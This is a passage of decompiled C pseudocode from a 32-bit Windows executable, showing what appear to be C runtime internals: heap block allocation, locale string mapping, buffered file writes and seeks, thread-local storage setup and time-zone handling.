          piVar5 = (int *)FUN_00417840(piVar8,*puVar10,param_1);
          if (piVar5 != (int *)0x0) {
            PTR_LOOP_0042cee8 = (undefined *)piVar11;
            *puVar10 = *puVar10 - param_1;
            piVar11[2] = (int)puVar10;
            return piVar5;
          }
          puVar10[1] = param_1;
        }
        piVar8 = piVar8 + 0x400;
      }
    }
    piVar11 = (int *)*piVar11;
  } while (piVar11 != (int *)PTR_LOOP_0042cee8);
  ppuVar7 = &PTR_LOOP_0042aec8;
  while ((ppuVar7[4] == (undefined *)0xffffffff || (ppuVar7[3] == (undefined *)0x0))) {
    ppuVar7 = (undefined **)*ppuVar7;
    if (ppuVar7 == &PTR_LOOP_0042aec8) {
      ppuVar7 = FUN_004172a0();
      if (ppuVar7 == (undefined **)0x0) {
        return (int *)0x0;
      }
      piVar11 = (int *)ppuVar7[4];
      *(char *)(piVar11 + 2) = (char)param_1;
      PTR_LOOP_0042cee8 = (undefined *)ppuVar7;
      *piVar11 = (int)piVar11 + param_1 + 8;
      piVar11[1] = 0xf0 - param_1;
      ppuVar7[6] = ppuVar7[6] + -(param_1 & 0xff);
      return piVar11 + 0x40;
    }
  }
  ppuVar3 = (undefined **)ppuVar7[3];
  puVar4 = *ppuVar3;
  piVar11 = (int *)(ppuVar7[4] + ((int)ppuVar3 + (-0x18 - (int)ppuVar7) >> 3) * 0x1000);
  ppuVar6 = ppuVar3;
  for (iVar9 = 0; (puVar4 == (undefined *)0xffffffff && (iVar9 < 0x10)); iVar9 = iVar9 + 1) {
    puVar4 = ppuVar6[2];
    ppuVar6 = ppuVar6 + 2;
  }
  piVar8 = VirtualAlloc(piVar11,iVar9 << 0xc,0x1000,4);
  if (piVar8 != piVar11) {
    return (int *)0x0;
  }
  ppuVar6 = ppuVar3;
  if (0 < iVar9) {
    piVar8 = piVar11 + 1;
    do {
      *piVar8 = 0xf0;
      piVar8[-1] = (int)(piVar8 + 1);
      *(undefined1 *)(piVar8 + 0x3d) = 0xff;
      *ppuVar6 = (undefined *)0xf0;
      ppuVar6[1] = (undefined *)0xf1;
      piVar8 = piVar8 + 0x400;
      ppuVar6 = ppuVar6 + 2;
      iVar9 = iVar9 + -1;
    } while (iVar9 != 0);
  }
  ppuVar1 = ppuVar7 + 0x806;
  bVar12 = false;
  if (ppuVar6 < ppuVar1) {
    do {
      if (*ppuVar6 == (undefined *)0xffffffff) break;
      ppuVar6 = ppuVar6 + 2;
    } while (ppuVar6 < ppuVar1);
    bVar12 = ppuVar6 < ppuVar1;
  }
  PTR_LOOP_0042cee8 = (undefined *)ppuVar7;
  ppuVar7[3] = (undefined *)(-(uint)bVar12 & (uint)ppuVar6);
  *(char *)(piVar11 + 2) = (char)param_1;
  ppuVar7[2] = (undefined *)ppuVar3;
  *ppuVar3 = *ppuVar3 + -param_1;
  piVar11[1] = piVar11[1] - param_1;
  *piVar11 = (int)piVar11 + param_1 + 8;
  return piVar11 + 0x40;
}



/* VA 00417840 */

int __cdecl FUN_00417840(int *param_1,uint param_2,uint param_3)

{
  byte bVar1;
  byte *pbVar2;
  byte *pbVar3;
  byte *pbVar4;
  uint uVar5;
  byte *pbVar6;

  pbVar2 = (byte *)*param_1;
  if (param_3 <= (uint)param_1[1]) {
    *pbVar2 = (byte)param_3;
    if (pbVar2 + param_3 < param_1 + 0x3e) {
      *param_1 = *param_1 + param_3;
      param_1[1] = param_1[1] - param_3;
    }
    else {
      param_1[1] = 0;
      *param_1 = (int)(param_1 + 2);
    }
    return (int)(pbVar2 + 8) * 0x10 + (int)param_1 * -0xf;
  }
  pbVar6 = pbVar2;
  if (pbVar2[param_1[1]] != 0) {
    pbVar6 = pbVar2 + param_1[1];
  }
  if (pbVar6 + param_3 < param_1 + 0x3e) {
    do {
      if (*pbVar6 == 0) {
        pbVar3 = pbVar6 + 1;
        uVar5 = 1;
        bVar1 = pbVar6[1];
        while (bVar1 == 0) {
          pbVar3 = pbVar3 + 1;
          uVar5 = uVar5 + 1;
          bVar1 = *pbVar3;
        }
        if (param_3 <= uVar5) {
          if (param_1 + 0x3e <= pbVar6 + param_3) {
            *param_1 = (int)(param_1 + 2);
            goto LAB_0041798f;
          }
          *param_1 = (int)(pbVar6 + param_3);
          param_1[1] = uVar5 - param_3;
          goto LAB_00417996;
        }
        if (pbVar6 == pbVar2) {
          param_1[1] = uVar5;
        }
        else {
          param_2 = param_2 - uVar5;
          if (param_2 < param_3) {
            return 0;
          }
        }
      }
      else {
        pbVar3 = pbVar6 + *pbVar6;
      }
      pbVar6 = pbVar3;
    } while (pbVar3 + param_3 < param_1 + 0x3e);
  }
  pbVar3 = (byte *)(param_1 + 2);
  pbVar6 = pbVar3;
  if (pbVar3 < pbVar2) {
    while (pbVar6 + param_3 < param_1 + 0x3e) {
      if (*pbVar6 == 0) {
        pbVar4 = pbVar6 + 1;
        uVar5 = 1;
        bVar1 = pbVar6[1];
        while (bVar1 == 0) {
          pbVar4 = pbVar4 + 1;
          uVar5 = uVar5 + 1;
          bVar1 = *pbVar4;
        }
        if (param_3 <= uVar5) {
          if (pbVar6 + param_3 < param_1 + 0x3e) {
            *param_1 = (int)(pbVar6 + param_3);
            param_1[1] = uVar5 - param_3;
          }
          else {
            *param_1 = (int)pbVar3;
LAB_0041798f:
            param_1[1] = 0;
          }
LAB_00417996:
          *pbVar6 = (byte)param_3;
          return (int)(pbVar6 + 8) * 0x10 + (int)param_1 * -0xf;
        }
        param_2 = param_2 - uVar5;
        if (param_2 < param_3) {
          return 0;
        }
      }
      else {
        pbVar4 = pbVar6 + *pbVar6;
      }
      pbVar6 = pbVar4;
      if (pbVar2 <= pbVar4) {
        return 0;
      }
    }
  }
  return 0;
}



/* VA 004179c0 */

undefined4 __cdecl FUN_004179c0(int param_1,int *param_2,byte *param_3,uint param_4)

{
  byte *pbVar1;
  int iVar2;
  int *piVar3;
  byte bVar4;
  undefined4 uVar5;
  int iVar6;
  uint uVar7;
  byte *pbVar8;

  uVar5 = 0;
  piVar3 = (int *)(param_1 + 0x18 + ((int)param_2 - *(int *)(param_1 + 0x10) >> 0xc) * 8);
  uVar7 = (uint)*param_3;
  if (uVar7 <= param_4) {
    if ((uVar7 < param_4) && (pbVar1 = param_3 + param_4, pbVar1 <= param_2 + 0x3e)) {
      for (pbVar8 = param_3 + uVar7; (pbVar8 < pbVar1 && (*pbVar8 == 0)); pbVar8 = pbVar8 + 1) {
      }
      if (pbVar8 == pbVar1) {
        *param_3 = (byte)param_4;
        if ((param_3 <= (byte *)*param_2) && ((byte *)*param_2 < pbVar1)) {
          if (pbVar1 < param_2 + 0x3e) {
            *param_2 = (int)pbVar1;
            iVar6 = 0;
            bVar4 = *pbVar1;
            while (bVar4 == 0) {
              iVar2 = iVar6 + 1;
              iVar6 = iVar6 + 1;
              bVar4 = pbVar1[iVar2];
            }
            param_2[1] = iVar6;
          }
          else {
            param_2[1] = 0;
            *param_2 = (int)(param_2 + 2);
          }
        }
        *piVar3 = *piVar3 + (uVar7 - param_4);
        uVar5 = 1;
      }
    }
    return uVar5;
  }
  *param_3 = (byte)param_4;
  piVar3[1] = 0xf1;
  *piVar3 = *piVar3 + (uVar7 - param_4);
  return 1;
}



/* VA 00417a90 */

undefined4 __cdecl FUN_00417a90(undefined4 param_1)

{
  int iVar1;

  if (DAT_0042ed38 != (code *)0x0) {
    iVar1 = (*DAT_0042ed38)(param_1);
    if (iVar1 != 0) {
      return 1;
    }
  }
  return 0;
}



/* VA 00417b00 */

int __cdecl
FUN_00417b00(LCID param_1,uint param_2,char *param_3,LPCWSTR param_4,LPWSTR param_5,int param_6,
            UINT param_7)

{
  int iVar1;
  LPCWSTR cbMultiByte;
  LPCWSTR lpWideCharStr;
  int iVar2;

  if (DAT_0042ed68 == 0) {
    iVar1 = LCMapStringA(0,0x100,"",1,(LPSTR)0x0,0);
    if (iVar1 == 0) {
      iVar1 = LCMapStringW(0,0x100,L"",1,(LPWSTR)0x0,0);
      if (iVar1 == 0) {
        return 0;
      }
      DAT_0042ed68 = 1;
    }
    else {
      DAT_0042ed68 = 2;
    }
  }
  cbMultiByte = param_4;
  if (0 < (int)param_4) {
    cbMultiByte = (LPCWSTR)FUN_00417d20(param_3,(int)param_4);
  }
  if (DAT_0042ed68 == 2) {
    iVar1 = LCMapStringA(param_1,param_2,param_3,(int)cbMultiByte,(LPSTR)param_5,param_6);
    return iVar1;
  }
  if (DAT_0042ed68 != 1) {
    return DAT_0042ed68;
  }
  param_4 = (LPCWSTR)0x0;
  if (param_7 == 0) {
    param_7 = DAT_0042ed60;
  }
  iVar1 = MultiByteToWideChar(param_7,9,param_3,(int)cbMultiByte,(LPWSTR)0x0,0);
  if (iVar1 == 0) {
    return 0;
  }
  lpWideCharStr = (LPCWSTR)FUN_00414db0(iVar1 * 2);
  if (lpWideCharStr == (LPCWSTR)0x0) {
    return 0;
  }
  iVar2 = MultiByteToWideChar(param_7,1,param_3,(int)cbMultiByte,lpWideCharStr,iVar1);
  if ((iVar2 != 0) &&
     (iVar2 = LCMapStringW(param_1,param_2,lpWideCharStr,iVar1,(LPWSTR)0x0,0), iVar2 != 0)) {
    if ((param_2 & 0x400) == 0) {
      param_4 = (LPCWSTR)FUN_00414db0(iVar2 * 2);
      if ((param_4 == (LPCWSTR)0x0) ||
         (iVar1 = LCMapStringW(param_1,param_2,lpWideCharStr,iVar1,param_4,iVar2), iVar1 == 0))
      goto LAB_00417cff;
      if (param_6 == 0) {
        iVar2 = WideCharToMultiByte(param_7,0x220,param_4,iVar2,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0
                                   );
        iVar1 = iVar2;
      }
      else {
        iVar2 = WideCharToMultiByte(param_7,0x220,param_4,iVar2,(LPSTR)param_5,param_6,(LPCSTR)0x0,
                                    (LPBOOL)0x0);
        iVar1 = iVar2;
      }
    }
    else {
      if (param_6 == 0) goto LAB_00417c64;
      if (param_6 < iVar2) goto LAB_00417cff;
      iVar1 = LCMapStringW(param_1,param_2,lpWideCharStr,iVar1,param_5,param_6);
    }
    if (iVar1 != 0) {
LAB_00417c64:
      FUN_00414d40((undefined *)lpWideCharStr);
      FUN_00414d40((undefined *)param_4);
      return iVar2;
    }
  }
LAB_00417cff:
  FUN_00414d40((undefined *)lpWideCharStr);
  FUN_00414d40((undefined *)param_4);
  return 0;
}



/* VA 00417d20 */

int __cdecl FUN_00417d20(char *param_1,int param_2)

{
  char *pcVar1;
  int iVar2;

  iVar2 = param_2;
  for (pcVar1 = param_1; (iVar2 != 0 && (iVar2 = iVar2 + -1, *pcVar1 != '\0')); pcVar1 = pcVar1 + 1)
  {
  }
  if (*pcVar1 != '\0') {
    return param_2;
  }
  return (int)pcVar1 - (int)param_1;
}



/* VA 00417d50 */

uint __cdecl FUN_00417d50(uint param_1,int *param_2)

{
  uint uVar1;
  char *pcVar2;
  int *piVar3;
  byte bVar4;
  undefined3 extraout_var;
  undefined *puVar5;
  uint uVar6;
  uint uVar7;

  piVar3 = param_2;
  uVar7 = param_2[3];
  uVar1 = param_2[4];
  if (((uVar7 & 0x82) == 0) || ((uVar7 & 0x40) != 0)) {
LAB_00417e73:
    param_2[3] = uVar7 | 0x20;
    return 0xffffffff;
  }
  uVar6 = 0;
  if ((uVar7 & 1) != 0) {
    param_2[1] = 0;
    if ((uVar7 & 0x10) == 0) goto LAB_00417e73;
    *param_2 = param_2[2];
    param_2[3] = uVar7 & 0xfffffffe;
  }
  uVar7 = param_2[3];
  param_2[1] = 0;
  param_2[3] = uVar7 & 0xffffffef | 2;
  if ((uVar7 & 0x10c) == 0) {
    if ((param_2 == (int *)&DAT_0042d1e0) || (param_2 == (int *)&DAT_0042d200)) {
      bVar4 = FUN_0041cb50(uVar1);
      if (CONCAT31(extraout_var,bVar4) != 0) goto LAB_00417dc3;
    }
    FUN_0041caf0(piVar3);
  }
LAB_00417dc3:
  if ((piVar3[3] & 0x108U) == 0) {
    uVar7 = 1;
    uVar6 = FUN_00418af0(uVar1,(char *)&param_1,1);
  }
  else {
    pcVar2 = (char *)piVar3[2];
    uVar7 = *piVar3 - (int)pcVar2;
    *piVar3 = (int)(pcVar2 + 1);
    piVar3[1] = piVar3[6] + -1;
    if ((int)uVar7 < 1) {
      if (uVar1 == 0xffffffff) {
        puVar5 = &DAT_0042d5f8;
      }
      else {
        puVar5 = (undefined *)((&DAT_00430280)[(int)uVar1 >> 5] + (uVar1 & 0x1f) * 0x24);
      }
      if ((puVar5[4] & 0x20) != 0) {
        FUN_00419040(uVar1,0,2);
      }
      *(undefined1 *)piVar3[2] = (undefined1)param_1;
    }
    else {
      uVar6 = FUN_00418af0(uVar1,pcVar2,uVar7);
      *(undefined1 *)piVar3[2] = (undefined1)param_1;
    }
  }
  if (uVar6 != uVar7) {
    piVar3[3] = piVar3[3] | 0x20;
    return 0xffffffff;
  }
  return param_1 & 0xff;
}



/* VA 00418810 */

void __cdecl FUN_00418810(uint param_1,int *param_2,int *param_3)

{
  int iVar1;
  uint uVar2;

  iVar1 = param_2[1];
  param_2[1] = iVar1 + -1;
  if (iVar1 + -1 < 0) {
    uVar2 = FUN_00417d50(param_1,param_2);
  }
  else {
    *(char *)*param_2 = (char)param_1;
    uVar2 = param_1 & 0xff;
    *param_2 = *param_2 + 1;
  }
  if (uVar2 == 0xffffffff) {
    *param_3 = -1;
    return;
  }
  *param_3 = *param_3 + 1;
  return;
}



/* VA 00418860 */

void __cdecl FUN_00418860(uint param_1,int param_2,int *param_3,int *param_4)

{
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    FUN_00418810(param_1,param_3,param_4);
  } while (*param_4 != -1);
  return;
}



/* VA 004188a0 */

void __cdecl FUN_004188a0(char *param_1,int param_2,int *param_3,int *param_4)

{
  char cVar1;

  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    cVar1 = *param_1;
    param_1 = param_1 + 1;
    FUN_00418810((int)cVar1,param_3,param_4);
  } while (*param_4 != -1);
  return;
}



/* VA 004188e0 */

undefined4 __cdecl FUN_004188e0(int *param_1)

{
  undefined4 *puVar1;

  puVar1 = (undefined4 *)*param_1;
  *param_1 = (int)(puVar1 + 1);
  return *puVar1;
}



/* VA 00418900 */

undefined8 __cdecl FUN_00418900(int *param_1)

{
  undefined8 *puVar1;

  puVar1 = (undefined8 *)*param_1;
  *param_1 = (int)(puVar1 + 1);
  return *puVar1;
}



/* VA 00418920 */

undefined4 __cdecl FUN_00418920(undefined4 *param_1)

{
  undefined2 *puVar1;
  undefined2 *puVar2;

  puVar1 = (undefined2 *)*param_1;
  puVar2 = puVar1 + 2;
  *param_1 = puVar2;
  return CONCAT22((short)((uint)puVar2 >> 0x10),*puVar1);
}



/* VA 00418a00 */

int __cdecl
FUN_00418a00(int param_1,int param_2,int param_3,int param_4,int param_5,int param_6,int param_7)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  tm local_24;

  uVar2 = param_1 - 0x76c;
  if (((int)uVar2 < 0x46) || (0x8a < (int)uVar2)) {
    return -1;
  }
  iVar3 = *(int *)(&DAT_0042df84 + param_2 * 4) + param_3;
  if (((uVar2 & 3) == 0) && (2 < param_2)) {
    iVar3 = iVar3 + 1;
  }
  FUN_004195b0();
  local_24.tm_hour = param_4;
  local_24.tm_mon = param_2 + -1;
  iVar1 = param_6 + (param_5 +
                    (param_4 + ((param_1 + -0x76d >> 2) + uVar2 * 0x16d + iVar3) * 0x18) * 0x3c) *
                    0x3c + 0x7c558180 + DAT_0042d440;
  if (param_7 != 1) {
    if (param_7 != -1) {
      return iVar1;
    }
    if (DAT_0042d444 == 0) {
      return iVar1;
    }
    local_24.tm_year = uVar2;
    local_24.tm_yday = iVar3;
    iVar3 = __isindst(&local_24);
    if (iVar3 == 0) {
      return iVar1;
    }
  }
  return iVar1 + DAT_0042d448;
}



/* VA 00418af0 */

int __cdecl FUN_00418af0(uint param_1,char *param_2,uint param_3)

{
  int iVar1;
  DWORD *pDVar2;

  if ((param_1 < DAT_00430380) &&
     ((*(byte *)((&DAT_00430280)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x24) & 1) != 0)) {
    FUN_0041ab50(param_1);
    iVar1 = FUN_00418b70(param_1,param_2,param_3);
    FUN_0041abc0(param_1);
    return iVar1;
  }
  pDVar2 = FUN_00419020();
  *pDVar2 = 9;
  pDVar2 = FUN_00419030();
  *pDVar2 = 0;
  return -1;
}



/* VA 00418b70 */

int __cdecl FUN_00418b70(uint param_1,char *param_2,uint param_3)

{
  int *piVar1;
  char cVar2;
  char *pcVar3;
  BOOL BVar4;
  DWORD *pDVar5;
  int iVar6;
  char *pcVar7;
  DWORD local_41c;
  undefined *local_414;
  DWORD local_410;
  int local_40c;
  int *local_408;
  char local_404 [1028];

  local_41c = 0;
  local_40c = 0;
  if (param_3 == 0) {
    return 0;
  }
  piVar1 = &DAT_00430280 + ((int)param_1 >> 5);
  iVar6 = (param_1 & 0x1f) * 0x24;
  local_408 = piVar1;
  if ((*(byte *)(iVar6 + 4 + *piVar1) & 0x20) != 0) {
    FUN_004190c0(param_1,0,2);
  }
  if ((*(byte *)((undefined4 *)(*piVar1 + iVar6) + 1) & 0x80) == 0) {
    BVar4 = WriteFile(*(HANDLE *)(*piVar1 + iVar6),param_2,param_3,&local_410,(LPOVERLAPPED)0x0);
    if (BVar4 == 0) {
      local_414 = (undefined *)GetLastError();
    }
    else {
      local_41c = local_410;
      local_414 = (undefined *)0x0;
    }
  }
  else {
    local_414 = (undefined *)0x0;
    pcVar7 = param_2;
    if (param_3 != 0) {
      do {
        pcVar3 = local_404;
        do {
          if (param_3 <= (uint)((int)pcVar7 - (int)param_2)) break;
          cVar2 = *pcVar7;
          pcVar7 = pcVar7 + 1;
          if (cVar2 == '\n') {
            *pcVar3 = '\r';
            local_40c = local_40c + 1;
            pcVar3 = pcVar3 + 1;
          }
          *pcVar3 = cVar2;
          pcVar3 = pcVar3 + 1;
        } while ((int)pcVar3 - (int)local_404 < 0x400);
        BVar4 = WriteFile(*(HANDLE *)(iVar6 + *local_408),local_404,(int)pcVar3 - (int)local_404,
                          &local_410,(LPOVERLAPPED)0x0);
        if (BVar4 == 0) {
          local_414 = (undefined *)GetLastError();
          break;
        }
        local_41c = local_41c + local_410;
        if (((int)local_410 < (int)pcVar3 - (int)local_404) ||
           (param_3 <= (uint)((int)pcVar7 - (int)param_2))) break;
      } while( true );
    }
  }
  if (local_41c != 0) {
    return local_41c - local_40c;
  }
  if (local_414 == (undefined *)0x0) {
    if (((*(byte *)(iVar6 + 4 + *local_408) & 0x40) != 0) && (*param_2 == '\x1a')) {
      return 0;
    }
    pDVar5 = FUN_00419020();
    *pDVar5 = 0x1c;
    pDVar5 = FUN_00419030();
    *pDVar5 = 0;
    return -1;
  }
  if (local_414 != (undefined *)0x5) {
    FUN_00418fa0(local_414);
    return -1;
  }
  pDVar5 = FUN_00419020();
  *pDVar5 = 9;
  pDVar5 = FUN_00419030();
  *pDVar5 = 5;
  return -1;
}



/* VA 00418fa0 */

void __cdecl FUN_00418fa0(undefined *param_1)

{
  DWORD *pDVar1;
  undefined **ppuVar2;
  int iVar3;

  pDVar1 = FUN_00419030();
  iVar3 = 0;
  *pDVar1 = (DWORD)param_1;
  ppuVar2 = (undefined **)&DAT_0042d058;
  do {
    if (param_1 == *ppuVar2) {
      pDVar1 = FUN_00419020();
      *pDVar1 = *(DWORD *)(iVar3 * 8 + 0x42d05c);
      return;
    }
    ppuVar2 = ppuVar2 + 2;
    iVar3 = iVar3 + 1;
  } while (ppuVar2 < &PTR_DAT_0042d1c0);
  if (((undefined *)0x12 < param_1) && (param_1 < (undefined *)0x25)) {
    pDVar1 = FUN_00419020();
    *pDVar1 = 0xd;
    return;
  }
  if (((undefined *)0xbb < param_1) && (param_1 < (undefined *)0xcb)) {
    pDVar1 = FUN_00419020();
    *pDVar1 = 8;
    return;
  }
  pDVar1 = FUN_00419020();
  *pDVar1 = 0x16;
  return;
}



/* VA 00419020 */

DWORD * FUN_00419020(void)

{
  DWORD *pDVar1;

  pDVar1 = FUN_00419530();
  return pDVar1 + 2;
}



/* VA 00419030 */

DWORD * FUN_00419030(void)

{
  DWORD *pDVar1;

  pDVar1 = FUN_00419530();
  return pDVar1 + 3;
}



/* VA 00419040 */

DWORD __cdecl FUN_00419040(uint param_1,LONG param_2,DWORD param_3)

{
  DWORD DVar1;
  DWORD *pDVar2;

  if ((param_1 < DAT_00430380) &&
     ((*(byte *)((&DAT_00430280)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x24) & 1) != 0)) {
    FUN_0041ab50(param_1);
    DVar1 = FUN_004190c0(param_1,param_2,param_3);
    FUN_0041abc0(param_1);
    return DVar1;
  }
  pDVar2 = FUN_00419020();
  *pDVar2 = 9;
  pDVar2 = FUN_00419030();
  *pDVar2 = 0;
  return 0xffffffff;
}



/* VA 004190c0 */

DWORD __cdecl FUN_004190c0(uint param_1,LONG param_2,DWORD param_3)

{
  HANDLE hFile;
  DWORD *pDVar1;
  DWORD DVar2;
  undefined *puVar3;

  hFile = (HANDLE)FUN_0041ab00(param_1);
  if (hFile == (HANDLE)0xffffffff) {
    pDVar1 = FUN_00419020();
    *pDVar1 = 9;
    return 0xffffffff;
  }
  DVar2 = SetFilePointer(hFile,param_2,(PLONG)0x0,param_3);
  if (DVar2 == 0xffffffff) {
    puVar3 = (undefined *)GetLastError();
  }
  else {
    puVar3 = (undefined *)0x0;
  }
  if (puVar3 != (undefined *)0x0) {
    FUN_00418fa0(puVar3);
    return 0xffffffff;
  }
  *(byte *)((&DAT_00430280)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x24) =
       *(byte *)((&DAT_00430280)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x24) & 0xfd;
  return DVar2;
}



/* VA 004194b0 */

undefined4 FUN_004194b0(void)

{
  DWORD *lpTlsValue;
  BOOL BVar1;
  DWORD DVar2;

  FUN_004170f0();
  DAT_0042d4d8 = TlsAlloc();
  if (DAT_0042d4d8 != 0xffffffff) {
    lpTlsValue = (DWORD *)FUN_0041d0f0(1,0x74);
    if (lpTlsValue != (DWORD *)0x0) {
      BVar1 = TlsSetValue(DAT_0042d4d8,lpTlsValue);
      if (BVar1 != 0) {
        FUN_00419510((int)lpTlsValue);
        DVar2 = GetCurrentThreadId();
        *lpTlsValue = DVar2;
        lpTlsValue[1] = 0xffffffff;
        return 1;
      }
    }
  }
  return 0;
}



/* VA 00419510 */

void __cdecl FUN_00419510(int param_1)

{
  *(undefined **)(param_1 + 0x50) = &DAT_0042d620;
  *(undefined4 *)(param_1 + 0x14) = 1;
  return;
}



/* VA 00419530 */

DWORD * FUN_00419530(void)

{
  DWORD dwErrCode;
  DWORD *lpTlsValue;
  BOOL BVar1;
  DWORD DVar2;

  dwErrCode = GetLastError();
  lpTlsValue = TlsGetValue(DAT_0042d4d8);
  if (lpTlsValue == (DWORD *)0x0) {
    lpTlsValue = (DWORD *)FUN_0041d0f0(1,0x74);
    if (lpTlsValue != (DWORD *)0x0) {
      BVar1 = TlsSetValue(DAT_0042d4d8,lpTlsValue);
      if (BVar1 != 0) {
        FUN_00419510((int)lpTlsValue);
        DVar2 = GetCurrentThreadId();
        *lpTlsValue = DVar2;
        lpTlsValue[1] = 0xffffffff;
        SetLastError(dwErrCode);
        return lpTlsValue;
      }
    }
    __amsg_exit(0x10);
  }
  SetLastError(dwErrCode);
  return lpTlsValue;
}



/* VA 004195b0 */

void FUN_004195b0(void)

{
  if (DAT_0042ee28 == 0) {
    FUN_00417120(0xb);
    if (DAT_0042ee28 == 0) {
      FUN_004195f0();
      DAT_0042ee28 = DAT_0042ee28 + 1;
    }
    FUN_004171a0(0xb);
  }
  return;
}



/* VA 004195f0 */

void FUN_004195f0(void)

{
  byte bVar1;
  byte bVar2;
  byte *pbVar3;
  DWORD DVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  byte *pbVar9;
  bool bVar10;

  FUN_00417120(0xc);
  DAT_0042ed70 = 0;
  DAT_0042d4f0 = 0xffffffff;
  DAT_0042d4e0 = 0xffffffff;
  pbVar3 = (byte *)FUN_0041d4f0(&DAT_00428138);
  if (pbVar3 == (byte *)0x0) {
    FUN_004171a0(0xc);
    DVar4 = GetTimeZoneInformation((LPTIME_ZONE_INFORMATION)&DAT_0042ed78);
    if (DVar4 == 0xffffffff) {
      return;
    }
    DAT_0042ed70 = 1;
    DAT_0042d440 = DAT_0042ed78 * 0x3c;
    if (DAT_0042edbe != 0) {
      DAT_0042d440 = DAT_0042d440 + DAT_0042edcc * 0x3c;
    }
    if ((DAT_0042ee12 == 0) || (DAT_0042ee20 == 0)) {
      DAT_0042d444 = 0;
      DAT_0042d448 = 0;
    }
    else {
      DAT_0042d444 = 1;
      DAT_0042d448 = (DAT_0042ee20 - DAT_0042edcc) * 0x3c;
    }
    FUN_0041d240(PTR_DAT_0042d4d0,(LPCWSTR)&DAT_0042ed7c,0x40);
    FUN_0041d240(PTR_DAT_0042d4d4,(LPCWSTR)&DAT_0042edd0,0x40);
    PTR_DAT_0042d4d4[0x3f] = 0;
    PTR_DAT_0042d4d0[0x3f] = 0;
    return;
  }
  if (*pbVar3 != 0) {
    pbVar8 = pbVar3;
    pbVar9 = DAT_0042ee24;
    if (DAT_0042ee24 != (byte *)0x0) {
      do {
        bVar1 = *pbVar8;
        bVar10 = bVar1 < *pbVar9;
        if (bVar1 != *pbVar9) {
LAB_00419747:
          iVar5 = (1 - (uint)bVar10) - (uint)(bVar10 != 0);
          goto LAB_0041974c;
        }
        if (bVar1 == 0) break;
        bVar1 = pbVar8[1];
        bVar10 = bVar1 < pbVar9[1];
        if (bVar1 != pbVar9[1]) goto LAB_00419747;
        pbVar8 = pbVar8 + 2;
        pbVar9 = pbVar9 + 2;
      } while (bVar1 != 0);
      iVar5 = 0;
LAB_0041974c:
      if (iVar5 == 0) goto LAB_004198b9;
    }
    FUN_00414d40(DAT_0042ee24);
    uVar6 = 0xffffffff;
    pbVar8 = pbVar3;
    do {
      if (uVar6 == 0) break;
      uVar6 = uVar6 - 1;
      bVar1 = *pbVar8;
      pbVar8 = pbVar8 + 1;
    } while (bVar1 != 0);
    DAT_0042ee24 = (byte *)FUN_00414db0(~uVar6);
    if (DAT_0042ee24 != (byte *)0x0) {
      uVar6 = 0xffffffff;
      pbVar8 = pbVar3;
      do {
        pbVar9 = pbVar8;
        if (uVar6 == 0) break;
        uVar6 = uVar6 - 1;
        pbVar9 = pbVar8 + 1;
        bVar1 = *pbVar8;
        pbVar8 = pbVar9;
      } while (bVar1 != 0);
      uVar6 = ~uVar6;
      pbVar8 = pbVar9 + -uVar6;
      pbVar9 = DAT_0042ee24;
      for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {
        *(undefined4 *)pbVar9 = *(undefined4 *)pbVar8;
        pbVar8 = pbVar8 + 4;
        pbVar9 = pbVar9 + 4;
      }
      for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {
        *pbVar9 = *pbVar8;
        pbVar8 = pbVar8 + 1;
        pbVar9 = pbVar9 + 1;
      }
      FUN_004171a0(0xc);
      _strncpy(PTR_DAT_0042d4d0,(char *)pbVar3,3);
      pbVar8 = pbVar3 + 3;
      PTR_DAT_0042d4d0[3] = 0;
      bVar1 = *pbVar8;
      if (bVar1 == 0x2d) {
        pbVar8 = pbVar3 + 4;
      }
      iVar5 = FUN_00414e80(pbVar8);
      DAT_0042d440 = iVar5 * 0xe10;
      for (; (bVar2 = *pbVar8, bVar2 == 0x2b || (('/' < (char)bVar2 && ((char)bVar2 < ':'))));
          pbVar8 = pbVar8 + 1) {
      }
      if (*pbVar8 == 0x3a) {
        pbVar8 = pbVar8 + 1;
        iVar5 = FUN_00414e80(pbVar8);
        DAT_0042d440 = DAT_0042d440 + iVar5 * 0x3c;
        bVar2 = *pbVar8;
        while (('/' < (char)bVar2 && ((char)bVar2 < ':'))) {
          pbVar3 = pbVar8 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar3;
        }
        if (*pbVar8 == 0x3a) {
          pbVar8 = pbVar8 + 1;
          iVar5 = FUN_00414e80(pbVar8);
          DAT_0042d440 = DAT_0042d440 + iVar5;
          bVar2 = *pbVar8;
          while (('/' < (char)bVar2 && ((char)bVar2 < ':'))) {
            pbVar3 = pbVar8 + 1;
            pbVar8 = pbVar8 + 1;
            bVar2 = *pbVar3;
          }
        }
      }
      if (bVar1 == 0x2d) {
        DAT_0042d440 = -DAT_0042d440;
      }
      DAT_0042d444 = (int)(char)*pbVar8;
      if (DAT_0042d444 == 0) {
        *PTR_DAT_0042d4d4 = 0;
        return;
      }
      _strncpy(PTR_DAT_0042d4d4,(char *)pbVar8,3);
      PTR_DAT_0042d4d4[3] = 0;
      return;
    }
  }
LAB_004198b9:
  FUN_004171a0(0xc);
  return;
}



/* VA 004198d0 */

/* Library Function - Single Match
    __isindst

   Library: Visual Studio 1998 Release */

int __cdecl __isindst(tm *_Time)

{
  bool bVar1;
  undefined3 extraout_var;

  FUN_00417120(0xb);
  bVar1 = FUN_00419900(&_Time->tm_sec);
  FUN_004171a0(0xb);
  return CONCAT31(extraout_var,bVar1);
}



/* VA 00419900 */

bool __cdecl FUN_00419900(int *param_1)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;

  if (DAT_0042d444 == 0) {
    return false;
  }
  uVar7 = param_1[5];
  if ((uVar7 == DAT_0042d4e0) && (uVar7 == DAT_0042d4f0)) goto LAB_00419ad4;
